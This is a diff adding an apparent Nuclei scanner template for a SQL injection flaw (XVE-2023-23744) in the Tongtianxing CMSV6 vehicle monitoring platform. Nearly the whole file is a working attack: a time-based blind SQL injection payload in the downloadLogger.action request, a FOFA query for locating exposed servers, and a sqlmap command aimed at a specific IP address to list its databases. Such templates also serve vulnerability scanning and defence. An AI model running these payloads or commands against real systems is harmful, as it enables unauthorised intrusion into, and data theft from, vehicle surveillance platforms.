@@ -1,0 +1,29 @@
+id: gsky-cmsv6-downloadlogger-action-sqli
+info:
+  name: 通天星 CMSV6 车载视频监控平台 downloadLogger.action - sqli
+  author: leadlife
+  severity: high
+  description: 通天星CMSV6车载定位监控平台SQL注入漏洞(XVE-2023-23744)
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E9%80%9A%E5%A4%A9%E6%98%9FCMSV6%E8%BD%A6%E8%BD%BD%E5%AE%9A%E4%BD%8D%E7%9B%91%E6%8E%A7%E5%B9%B3%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E(XVE-2023-23744).md
+  metadata:
+    verified: true
+    fofa-query: body="./open/webApi.html"||body="/808gps/"
+    sqlmap: sqlmap -u "http://13.211.19.22/run_stop/delete.do;downloadLogger.action?ids=1" -p ids --dbs
+  tags: g-sky,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout 15s
+        GET /run_stop/delete.do;downloadLogger.action?ids=1)+AND+(SELECT+5394+FROM+(SELECT(SLEEP(6)))tdpw)--+&loadAll=1 HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+          - contains_all(body,'pagination','infos','resMap')
+        condition: and
+        
